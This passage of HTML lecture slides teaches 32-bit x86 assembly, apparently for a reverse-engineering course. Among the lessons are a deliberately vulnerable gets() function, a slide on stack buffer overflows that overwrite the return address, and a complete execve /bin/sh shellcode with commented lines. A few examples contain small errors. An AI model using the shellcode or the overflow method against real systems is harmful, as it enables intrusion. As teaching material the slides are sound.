      <li>After the invention of paging, segments fell out of favor</li>
      <li>Now all they're there for is backwards compatibility</li>
    </ul>
  <h2>Sections of a Process Image</h2>    
    <div style="float:left">
      <ul>
          <li><kbd><span style='color:#008073; '>.data</span></kbd>
            <ul><li>Initialized Data</li></ul>
          </li>
          <li><kbd>.bss</kbd>
            <ul><li>Uninitialized Data (set to 0)</li></ul>
          </li>
          <li><kbd>.text</kbd>
            <ul><li>Code</li>
                <li>Entry Point (<kbd>_start</kbd>)</li></ul>
          </li>
          <li>The Stack
            <ul><li>Local variables</li></ul>
          </li>
          <li>The Heap
            <ul><li>Dynamically allocated memory (malloc/new)</li></ul>
          </li>
      </ul>
    </div>
<pre style='color:#d1d1d1;background: #333333;'><span style='color:#008073;'>section</span> <span style='color:#008073; '>.data</span><span style='color:#d2cd86; '>:</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;message:</span> <span style='color:#008073; '>db</span> <span style='color:#00c4c4; '>'Hello World!'</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;bufsz:</span>   <span style='color:#008073; '>dd</span> <span style='color:#008c00; '>1024</span>
<span style='color:#008073; '>section</span> .bss<span style='color:#d2cd86; '>:</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;fname:</span>   <span style='color:#e66170; font-weight:bold; '>resb</span> <span style='color:#008c00; '>255</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;num:</span>     <span style='color:#e66170; font-weight:bold; '>resd</span> <span style='color:#008c00; '>1</span>
<span style='color:#008073; '>section</span> .text<span style='color:#d2cd86; '>:</span>
<span style='color:#008073; '>global</span> _start
<span style='color:#e34adc; '>_start:</span>
<span style='color:#d2cd86; '>&#xa0;&#xa0;&#xa0;&#xa0;(</span>...<span style='color:#d2cd86; '>)</span>
<span style='color:#e66170; font-weight:bold; '>&#xa0;&#xa0;&#xa0;&#xa0;call</span> <span style='color:#e34adc; '>main</span>
<span style='color:#d2cd86; '>&#xa0;&#xa0;&#xa0;&#xa0;(</span>...<span style='color:#d2cd86; '>)</span></pre>
  <h2>Memory Layout</h2>      
<pre>
+=============+
|    Stack    | ~0xff8e0000
+-------------+
|   Lots of   |
|    Empty    |
|    Space    |
+-------------+
|    Heap     | ~0x993a0000
+-------------+
|   Lots of   |
|    Empty    |
|    Space    |
+-------------+
|    .bss     |
+-------------+
|   .data     |
+-------------+
|   .text     | ~0x08040000
+-------------+
</pre>
  <h2>Registers</h2>       
    <ul>
      <li>General Purpose (eax, ebx, ecx, edx)
        <ul>
          <li>Leftovers from the 16-bit days</li>
          <li>ax, bx, cx, and dx refer to low 16 bits</li>
          <li>?h refers to the high 8 bits of ?x</li>
          <li>?l refers to the low 8 bits of ?x</li>
        </ul>
      </li>
      <li>Stack Pointer (esp)</li>
      <li>Base Pointer (ebp)</li>
      <li>Index Registers (edi, esi)
        <ul>
          <li>These are GPRs that also have special instructions</li>
        </ul>
      </li>
    </ul>
    <p> Register naming example: </p>
<pre>
         +----------------+--------+--------+
     eax |             ax |   ah   |   al   |
         +----------------+--------+--------+
</pre>
  <h2>Standard Instructions</h2>
    <p> Note that at most one argument to an instruction may be a
    memory argument, and at least one argument must be a
    register (some exceptions). </p>
    <table><tbody>
      <tr>
        <td> mov eax, ebx &nbsp; &nbsp;</td> 
        <td> eax = ebx; </td>
      </tr>
      <tr>
        <td> add eax, ebx &nbsp; &nbsp;</td>
        <td> eax += ebx; </td>
      </tr>
      <tr>
        <td> sub eax, ebx &nbsp; &nbsp;</td>
        <td> eax -= ebx; </td>
      </tr>
      <tr>
        <td> inc eax &nbsp; &nbsp;</td>
        <td> ++eax; </td>
      </tr>
      <tr>
        <td> dec eax &nbsp; &nbsp;</td>
        <td> --eax; </td>
      </tr>
      <tr>
        <td> call foo &nbsp; &nbsp;</td>
        <td> foo(); </td>
      </tr>
      <tr>
        <td> ret &nbsp; &nbsp;</td>
        <td> return eax; </td>
      </tr>
      <tr>
        <td> push 10h &nbsp; &nbsp;</td>
        <td> *--esp = 0x10; </td>
      </tr>
      <tr>
        <td> pop eax &nbsp; &nbsp;</td>
        <td> eax = *esp++; </td>
      </tr>
      </tbody></table>
  <h2>Memory Addressing</h2>
    <h3>Syntax</h3>
      <ul>
        <li>Memory references are always surrounded by brackets, like [esp]
            (equlvalent to *esp)</li>
        <li>Labels are by default pointers, so references to the value of
            global variables look like [foo]</li>
        <li>Most instructions can take <b>at most one</b> memory reference</li>
        <li>Each memory reference can have <b>up to</b> three components:
          <ul>
            <li>Base Address (Register)</li>
            <li>Index (Register) * ElemSize (1, 2, 4, or 8)</li>
            <li>Displacement (Constant)</li>
          </ul>
        </li>
      </ul>
      <br />
      <kbd>[<span style='color:#d0d09f; '>Base</span> + <span style='color:#d0d09f; '>Index</span>*<span style='color:#008c00; '>ElemSize</span> &plusmn; <span style='color:#00a800; '>Displacement</span>]</kbd>
    <h3>Examples</h3>
      <ul>
        <li><kbd><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>]</span></kbd> is equivalent to <kbd><code class="language-c">*eax</code></kbd></li>
        <li><kbd><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>-</span><span style='color:#00a800; '>8</span><span style='color:#d2cd86; '>]</span></kbd> is equivalent to <kbd><code class="language-c">*(ebp-8)</code></kbd></li>
        <li><kbd><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>*</span><span style='color:#008c00; '>4</span><span style='color:#d2cd86; '>+</span><span style='color:#00a800; '>0x20</span><span style='color:#d2cd86; '>]</span></kbd> is equivalent to <kbd><code class="language-c">((int*)(esp+0x20))[eax]</code></kbd></li>
        <li><kbd><span style='color:#d2cd86; '>[</span><span style='color:#00a800; '>0xdeadbeef</span><span style='color:#d2cd86; '>]</span></kbd> is equivalent to <kbd><code class="language-c">*((int*)0xdeadbeef)</code></kbd></li>
        <li><kbd><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>foo</span><span style='color:#d2cd86; '>]</span></kbd> is equivalent to <kbd><code class="language-c">*foo</code></kbd> where foo is a global pointer</li>
        <li>Basically: Think [] implies dereference (*)</li>
      </ul>
    <h3>The LEA instruction</h3>
      <h4>Load Effective Address</h4>
      <ul>
        <li>A lot of the time we want to load some address to use later</li>
        <li>We can legally do something like <kbd><span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#008c00; '>8</span><span style='color:#d2cd86; '>]</span></kbd></li>
        <li>However, to get the address, <kbd><span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#008c00; '>8</span></kbd> is illegal</li>
        <li>So, we use the LEA instruction: <kbd><span style='color:#e66170; font-weight:bold; '>lea</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span><span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>+</span><span style='color:#008c00; '>8</span><span style='color:#d2cd86; '>]</span></kbd></li>
        <li>With LEA we can take the address of a memory reference and load it</li>
        <li>Basically: LEA is always used with [], and it loads the address of its argument instead.</li>
      </ul>
  <h2>The Stack</h2>
    <div class="col-md-5">
      <h3>Overview</h3>
      <ul>
        <li>The stack grows DOWNWARD
          <ul>
            <li>Top of the stack: lowest memory address</li>
          </ul>
        </li>
        <li>The esp register points to the top of the stack
          <ul>
            <li>Adding to esp removes items from the stack</li>
            <li>Subtracting to esp adds items to the stack</li>
          </ul>
        </li>
      </ul>
    </div>
    <div class="col-md-7">
      <img style="" src="http://<?php echo base_url('images/asm/stack_overview.svg'); ?>" />
    </div>
    <div class="col-md-5">
      <h3>Stack Frames and Calling Conventions</h3>
        <ul>
          <li>Caller pushes args on to stack, right to left</li>
          <li>Caller executes call instruction
            <ul>
              <li>call instruction pushes return address on to the stack</li>
            </ul>
          </li>
          <li>Callee pushes ebp onto stack, sets ebp to esp</li>
          <li>Callee then allocates space for local variables</li>
          <li>Return value is in eax</li>
          <li>eax, ecx, edx are caller-saved (all others callee-saved)</li>
          <li>After return, caller responsible for cleaning arguments off the stack</li>
        </ul>
    </div>
    <div class="col-md-7">
      <img  src="http://<?php echo base_url('images/asm/stack_frame.svg'); ?>" />
    </div>
  <h2>Function Example</h2>
      
<pre class="col-md-4 language-c line-numbers"><code>int identity(int x){
    return x;
}
</code></pre>
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#008073; '>global</span> identity
<span style='color:#e34adc; '>identity:</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebp</span>            <span style='color:#9999a9; '>; prologue</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>        <span style='color:#9999a9; '>;</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>+</span><span style='color:#008c00; '>8</span><span style='color:#d2cd86; '>]</span>    <span style='color:#9999a9; '>; do actual work</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ebp</span>        <span style='color:#9999a9; '>; epilogue</span>
    <span style='color:#e66170; font-weight:bold; '>pop</span> <span style='color:#d0d09f; '>ebp</span>             <span style='color:#9999a9; '>;</span>
    <span style='color:#e66170; font-weight:bold; '>ret</span>                 <span style='color:#9999a9; '>; return</span>
</pre>
  <h2>Function Call Example</h2>
<pre style="float:left" class="language-c"><code>ebx = identity(ebx);</code></pre>
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebx</span>         <span style='color:#9999a9; '>; push arguments on the stack</span>
<span style='color:#e66170; font-weight:bold; '>call</span> <span style='color:#e34adc; '>identity</span>    <span style='color:#9999a9; '>; call function</span>
<span style='color:#e66170; font-weight:bold; '>add</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>4</span>       <span style='color:#9999a9; '>; clean up passed arguments</span>
<span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>eax</span>     <span style='color:#9999a9; '>; put return value where we want it</span></pre>
  <h2>A quick note on ebp</h2>
    <h3>What's the frame pointer for</h3>
      <ul>
        <li>Constant location (esp changes when you ex. push/pop)
          <ul>
            <li>I cannot stress enough how much simpler this makes complex code</li>
          </ul>
        </li>
        <li>Provides a linked list of stack frames (useful for debugging)</li>
        <li>That said, some compilers don't use it
          <ul>
            <li>GCC has the -fomit-frame-pointer option</li>
            <li>This breaks some debuggers though</li>
            <li>Some functions need the frame pointer though:
              <ul>
                <li>alloca()</li>
                <li>C99 VLAs</li>
              </ul>
            </li>
          </ul>
        </li>
      </ul>
    <h3>Tips to Success</h3>
      <ul>
        <li>DRAW THE STACK OUT</li>
        <li>Update your stack diagram as things are changed in memory</li>
        <li>Keep track of which addresses refer to which variables</li>
        <li>Know what is in all of the registers at all times</li>
      </ul>
  <h2>A complete program: Hello World</h2>
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#008073; '>[BITS 32]</span>
 
<span style='color:#008073; '>section</span> <span style='color:#008073; '>.data</span><span style='color:#d2cd86; '>:</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;msg:</span>    <span style='color:#008073; '>db</span> `Hello<span style='color:#d2cd86; '>,</span> World<span style='color:#d2cd86; '>!</span>\n\<span style='color:#008c00; '>0</span>`  <span style='color:#9999a9; '>; use backticks for the string</span>
                                    <span style='color:#9999a9; '>; note that we need to manually add the \0</span>
 
<span style='color:#008073; '>section</span> .text<span style='color:#d2cd86; '>:</span>
    <span style='color:#008073; '>extern</span> printf           <span style='color:#9999a9; '>; have to declare what functions we use</span>
    <span style='color:#008073; '>global</span> main             <span style='color:#9999a9; '>; main is a global symbol (accessible from other files)</span>
 
<span style='color:#e34adc; '>main:</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebp</span>                <span style='color:#9999a9; '>; standard prologue</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>            <span style='color:#9999a9; '>;</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> msg                <span style='color:#9999a9; '>; push msg onto the stack (to use as an arg)</span>
    <span style='color:#e66170; font-weight:bold; '>call</span> <span style='color:#e34adc; '>printf</span>             <span style='color:#9999a9; '>; printf(msg)</span>
    <span style='color:#e66170; font-weight:bold; '>add</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>4</span>              <span style='color:#9999a9; '>; clean up the arg we pushed</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>0</span>              <span style='color:#9999a9; '>; put return code in eax</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ebp</span>            <span style='color:#9999a9; '>; standard epilogue</span>
    <span style='color:#e66170; font-weight:bold; '>pop</span> <span style='color:#d0d09f; '>ebp</span>                 <span style='color:#9999a9; '>;</span>
    <span style='color:#e66170; font-weight:bold; '>ret</span>
</pre>
  <h2>Another Function Example</h2>
<pre style="float:left" class="language-c line-numbers"><code>void vulnerable() {
    char buf[256];
    gets(buf);
}</code></pre>
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#008073; '>global</span> vulnerable
<span style='color:#e34adc; '>vulnerable:</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebp</span>            <span style='color:#9999a9; '>; prologue</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>        <span style='color:#9999a9; '>;</span>
    <span style='color:#e66170; font-weight:bold; '>sub</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>256</span>        <span style='color:#9999a9; '>; allocate space on stack for buf</span>
    <span style='color:#e66170; font-weight:bold; '>lea</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>-</span><span style='color:#008c00; '>256</span><span style='color:#d2cd86; '>]</span>  <span style='color:#9999a9; '>; load address of buf</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>eax</span>            <span style='color:#9999a9; '>; push args onto stack</span>
    <span style='color:#e66170; font-weight:bold; '>call</span> <span style='color:#e34adc; '>gets</span>           <span style='color:#9999a9; '>; perform function call</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ebp</span>        <span style='color:#9999a9; '>; epilogue</span>
    <span style='color:#e66170; font-weight:bold; '>pop</span> <span style='color:#d0d09f; '>ebp</span>             <span style='color:#9999a9; '>;</span>
    <span style='color:#e66170; font-weight:bold; '>ret</span>                 <span style='color:#9999a9; '>; return</span>
</pre>
  <h2>Exploit Techniques</h2>    
    <ul>
      <li>Return address is on the stack!</li>
      <li>Most common attack: overflow a stack buffer, overwrite return addr</li>
      <li>Vulnerable functions: gets(), scanf("%s"), strcpy()</li>
      <li>Overwrite the return address to run arbitrary</li>
      <li>Lots of techniques, varying degrees of sophistication</li>
      <li>Some defenses to mitigate dangers (more on this later...)</li>
    </ul>
  <h2>Branching</h2>
    <ul>
      <li>Unconditional branch: use the jmp instruction</li>
      <li>Conditional Branching has two steps: check, then jump</li>
      <li>Two different instructions for the check step:
        <ul>
          <li>test instruction: use to check if something is zero
            <ul>
              <li>Most commonly: arguments should be the same e.g. <kbd><span style='color:#e66170; font-weight:bold; '>test</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>eax</span></kbd></li>
              <li>Can use the jz (jump if zero) and jnz (jump if not zero) commands after a test</li>
            </ul>
          </li>
          <li>cmp instruction: compare two numbers
            <ul>
              <li>Use like <kbd><span style='color:#e66170; font-weight:bold; '>cmp</span> a<span style='color:#d2cd86; '>,</span> b</kbd></li>
              <li>Can use je (==) or jne (!=)</li>
              <li>Signed arguments: use jl (&lt;), jle (&lt;=), jge (&gt;=), jg (&gt;)</li>
              <li>Unsigned arguments: use jb (jump if below, &lt;), jbe (&lt;=), jae (&gt;=), ja (jump if above, &gt;)</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  <h2>Multiplication/Division (with bigger numbers)</h2>
    <ul>
      <li><kbd><span style='color:#e66170; font-weight:bold; '>mul</span> <span style='color:#d0d09f; '>reg</span></kbd> performs eax*reg and stores the result in edx:eax</li>
      <li>Above notation means that edx stores the overflow (i.e. result == edx*2<sup>32</sup> + eax)</li>
      <li>imul is the same, but for signed numbers</li>
      <li><kbd><span style='color:#e66170; font-weight:bold; '>div</span> <span style='color:#d0d09f; '>reg</span></kbd> divides edx:eax by reg and stores the result in eax, remainder in edx</li>
      <li>If there is overflow (i.e. result cannot fit in eax) the result is undefined/may crash</li>
      <li>idiv is the same again, but for signed numbers</li>
    </ul>
  <h2>Another Function Example</h2>
  <pre style="float:left;" class="language-c line-numbers"><code>int fact(int x) {
    if (x == 0) return 1;
    return x * fact(x - 1);
}</code></pre>
<pre style='color:#d1d1d1;background:#333333;'>
<span style='color:#008073; '>global</span> foo
<span style='color:#e34adc; '>foo:</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebp</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#d2cd86; '>[</span><span style='color:#d0d09f; '>ebp</span><span style='color:#d2cd86; '>+</span><span style='color:#008c00; '>8</span><span style='color:#d2cd86; '>]</span>
    <span style='color:#e66170; font-weight:bold; '>test</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>eax</span>
    <span style='color:#e66170; font-weight:bold; '>jnz</span> <span style='color:#e34adc; '>bar</span>
    <span style='color:#e66170; font-weight:bold; '>inc</span> <span style='color:#d0d09f; '>eax</span>
    <span style='color:#e66170; font-weight:bold; '>jmp</span> <span style='color:#e34adc; '>baz</span>
<span style='color:#e34adc; '>bar:</span>
    <span style='color:#e66170; font-weight:bold; '>dec</span> <span style='color:#d0d09f; '>eax</span>
    <span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>eax</span>
    <span style='color:#e66170; font-weight:bold; '>call</span> <span style='color:#e34adc; '>foo</span>
    <span style='color:#e66170; font-weight:bold; '>pop</span> <span style='color:#d0d09f; '>ecx</span>
    <span style='color:#e66170; font-weight:bold; '>inc</span> <span style='color:#d0d09f; '>ecx</span>
    <span style='color:#e66170; font-weight:bold; '>mul</span> <span style='color:#d0d09f; '>ecx</span>
<span style='color:#e34adc; '>baz:</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>esp</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ebp</span>
    <span style='color:#e66170; font-weight:bold; '>pop</span> <span style='color:#d0d09f; '>ebp</span>
    <span style='color:#e66170; font-weight:bold; '>ret</span>
</pre>
      <div style="clear:both"></div>
  <h2>Is assembly faster than C?</h2>
    <ul>
      <li class="action">YES, in a quick non-scientific benchmark (of previous slide), speedup = 1.196</li>
      <li class="action">BUT compilers have this awesome thing called optimization mode...
        <ul>
          <li>gcc -O1 is 1.327 times faster than assembly</li>
          <li>gcc -O4 is 4.565 times faster than assembly</li>
        </ul>
      </li>
      <li class="action">Moral of the story is, while assembly is important for RevEng...
        <ul>
          <li>You probably won't beat a compiler with optimizations. They're <b>really good</b> at this shit</li>
          <li>The best performance: have the compiler optimize C, then tweak assembly as needed</li>
        </ul>
      </li>
      <li class="action">Rule #1 of performance: <b>BENCHMARK</b>. #PrematureOptimizationIsTheRootOfAllEvil</li>
    </ul>
  <h2>System Calls</h2>    
    <ul>
      <li>How user processes invoke the kernel</li>
      <li>Activated by triggering interrupt 0x80</li>
      <li>man section 2 covers syscalls (same as in C)</li>
      <li>Separate calling convention though:
        <ul>
          <li>Syscall # in eax (see &lt;asm/unistd_32.h&gt;)</li>
          <li>Args (left to right on manpage) in ebx, ecx, edx, esi, edi, ebp</li>
          <li>Return value is in eax</li>
          <li>Values in range [-4095, -1] indicate an error</li>
        </ul>
      </li>
    </ul>
  <h2>Hello World, with System Calls</h2>
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#008073; '>[BITS 32]</span>
 
<span style='color:#008073; '>section</span> <span style='color:#008073; '>.data</span><span style='color:#d2cd86; '>:</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;hello:</span>      <span style='color:#008073; '>db</span> `Hello<span style='color:#d2cd86; '>,</span> World<span style='color:#d2cd86; '>!</span>\n`  <span style='color:#9999a9; '>; this time, don't need \0</span>
<span style='color:#e34adc; '>&#xa0;&#xa0;&#xa0;&#xa0;helloLen:</span>   <span style='color:#008073; '>dd</span> $<span style='color:#d2cd86; '>-</span>hello            <span style='color:#9999a9; '>; string length</span>
 
<span style='color:#008073; '>section</span> .text<span style='color:#d2cd86; '>:</span>
    <span style='color:#008073; '>global</span> _start
 
<span style='color:#e34adc; '>_start:</span>                     <span style='color:#9999a9; '>; not using C, use _start instead of main</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>4</span>              <span style='color:#9999a9; '>; write() syscall number</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebx</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>1</span>              <span style='color:#9999a9; '>; fd (STDOUT_FILENO)</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ecx</span><span style='color:#d2cd86; '>,</span> hello          <span style='color:#9999a9; '>; data (pointer) to write</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>edx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d2cd86; '>[</span>helloLen<span style='color:#d2cd86; '>]</span>     <span style='color:#9999a9; '>; number of bytes to write</span>
    <span style='color:#e66170; font-weight:bold; '>int</span> <span style='color:#00a800; '>0x80</span>                <span style='color:#9999a9; '>; call kernel</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>eax</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>1</span>              <span style='color:#9999a9; '>; exit() syscall number</span>
    <span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebx</span><span style='color:#d2cd86; '>,</span> <span style='color:#008c00; '>0</span>              <span style='color:#9999a9; '>; return code (0)</span>
    <span style='color:#e66170; font-weight:bold; '>int</span> <span style='color:#00a800; '>0x80</span>                <span style='color:#9999a9; '>; call kernel</span>
                            <span style='color:#9999a9; '>; NOTE: we cannot return from _start, must exit()</span>
</pre>
  <h2>Shellcode Example</h2>
<pre style='color:#d1d1d1;background:#333333;'><span style='color:#008073; '>[BITS 32]</span>
 
<span style='color:#9999a9; '>; Note that we MUST have a valid stack for this to work!</span>
 
<span style='color:#e66170; font-weight:bold; '>xor</span> <span style='color:#d0d09f; '>ecx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>ecx</span>       <span style='color:#9999a9; '>; zero ecx</span>
<span style='color:#e66170; font-weight:bold; '>mul</span> <span style='color:#d0d09f; '>ecx</span>            <span style='color:#9999a9; '>; edx:eax = eax*ecx, i.e. zeros edx and eax</span>
<span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>al</span><span style='color:#d2cd86; '>,</span> <span style='color:#00a800; '>0xb</span>        <span style='color:#9999a9; '>; set eax to 0xb, syscall number for execve</span>
<span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ecx</span>           <span style='color:#9999a9; '>; pushes a zero onto the stack (stack is \0\0\0\0)</span>
<span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#00c4c4; '>'//sh'</span>        <span style='color:#9999a9; '>; push '//sh' onto stack (stack is //sh\0\0\0\0)</span>
<span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#00c4c4; '>'/bin'</span>        <span style='color:#9999a9; '>; push '/bin' onto stack (stack is /bin//sh\0\0\0\0)</span>
<span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ebx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>       <span style='color:#9999a9; '>; set ebx (arg1: path) to stack pointer ('/bin//sh')</span>
<span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ecx</span>           <span style='color:#9999a9; '>; push another zero (execve needs a NULL at the end)</span>
<span style='color:#e66170; font-weight:bold; '>push</span> <span style='color:#d0d09f; '>ebx</span>           <span style='color:#9999a9; '>; push addr of "/bin//sh"</span>
<span style='color:#e66170; font-weight:bold; '>mov</span> <span style='color:#d0d09f; '>ecx</span><span style='color:#d2cd86; '>,</span> <span style='color:#d0d09f; '>esp</span>       <span style='color:#9999a9; '>; set ecx (arg2: argv) to ["/bin//sh", 0]</span>
                   <span style='color:#9999a9; '>; edx (arg3: envp) is already NULL from `mul ecx`</span>
<span style='color:#e66170; font-weight:bold; '>int</span> <span style='color:#00a800; '>80h</span>            <span style='color:#9999a9; '>; perform system call</span>
</pre>
</div>
<h2>Hello World Walkthrough (line-by-line)</h2>
<div id="deck">
  <h2>About these slides</h2>
    <div class="col-md-6">
      <ul>
        <li>This presentation goes through a sample Hello World program, line by line</li>
        <li>For the actual code, there will be a stack diagram to the right</li>
        <li>For stack diagrams, higher addresses are highest on the diagram</li>
        <li>Similarly, the top of the stack is at the bottom of the diagram</li>
        <li>The full code is above - the complete Hello World program using the C-libraries (printf) mainly</li>
      </ul>
    </div>
    <img class="col-md-6" src="http://<?php echo base_url('/images/asm/stack_overview.svg'); ?>" />
  <h2><kbd><span style='color:#008073; '>[BITS 32]</span></kbd></h2>
    <ul>
      <li>Tells the assembler we are writing 32-bit code</li>
      <li>Could also be <kbd><span style='color:#008073; '>[BITS 16]</span></kbd>, <kbd><span style='color:#008073; '>[BITS 64]</span></kbd></li>
    </ul>
  <h2><kbd><span style='color:#008073; '>section</span> <span style='color:#008073; '>.data</span><span style='color:#d2cd86; '>:</span></kbd></h2>
    <ul>
      <li>Begins the data section</li>
      <li>This is where all global variables are stored</li>
    </ul>
  <h2><kbd><span style='color:#e34adc; '>msg:</span>    <span style='color:#008073; '>db</span> `Hello<span style='color:#d2cd86; '>,</span> World<span style='color:#d2cd86; '>!</span>\n\<span style='color:#008c00; '>0</span>`</kbd></h2>
    <ul>
      <li>Defines a global variable msg</li>
      <li>The <kbd><span style='color:#e34adc; '>msg:</span></kbd> part defines a label.  Labels are like pointers to memory inside our program.</li>
      <li>The <kbd><span style='color:#008073; '>db</span></kbd> directive tells the assembler to place actual values into the program's memory.  It stands for Define Byte.</li>
      <li>It places the sequence of bytes `Hello, World\n\0` into the program's memory.  Note that you MUST use back ticks (`) with this assembler.</li>
      <li>Note that you have to manually null-terminate the string</li>
      <li>Other instructions you can use in the .data section to define global variables include <kbd><span style='color:#008073; '>dw</span></kbd> (Define Word, 16 bit values) and <kbd><span style='color:#008073; '>dd</span></kbd> (Define Doubleword, 32 bits).</li>
      <li>So, this line is equivalent to <code class="language-c">char* msg = "Hello, World!\n";</code></li>
    </ul>
  <h2><kbd><span style='color:#008073; '>section</span> .text<span style='color:#d2cd86; '>:</span></kbd></h2>
    <ul>
      <li>Begins the text section</li>
      <li>This is where all of the code resides</li>
    </ul>
  <h2><kbd><span style='color:#008073; '>extern</span> printf</kbd></h2>
    <ul>
      <li>Tells the assembler that another file defines printf</li>
      <li>We don't have #include files in assembly, but we still need to say what functions we are using</li>
      <li>Prevents errors from the assembler saying that it can't find printf in our program</li>
    </ul>
  <h2><kbd><span style='color:#008073; '>global</span> main</kbd></h2>
    <ul>
      <li>Tells the assembler that we want main to be a global symbol</li>
      <li>By default, the assembler removes all of our labels / symbols when it assembles our program</li>
      <li>However, the OS needs to be able to reference main when it loads our program</li>
      <li>Basically: if a function or variable needs to be referenced outside the current assembly file, you need to make it a global symbol</li>
    </ul>
